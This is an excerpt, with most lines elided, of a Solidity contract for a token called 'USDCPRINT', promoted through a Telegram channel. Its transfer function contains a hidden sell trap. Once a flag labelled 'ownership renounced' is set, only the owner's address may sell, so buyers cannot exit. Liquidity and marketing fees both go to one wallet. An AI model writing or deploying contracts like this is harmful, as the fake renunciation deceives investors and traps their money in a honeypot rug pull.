...
/** 
Telegram t.me/usdcprinterftm
twitter & website are available through our Telegram channel.
*/
...
USDC
*/
    IBEP20 EP = IBEP20(0x04068DA6C83AFCFA0e13ba15A6696662335D5B75); 
...
*/
    ...
    string constant _symbol = "USDCPRINT";
    ...
    address public autoLiquidityReceiver=0x0537Ac0Ae3f5F7ee77208265Ab0A20B881a2D3Dd; 
    address public marketingFeeReceiver=0x0537Ac0Ae3f5F7ee77208265Ab0A20B881a2D3Dd; 
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (isSell) {
            require((!OwnershipIsRenounced || sender==owner), "ownership is already renounced");
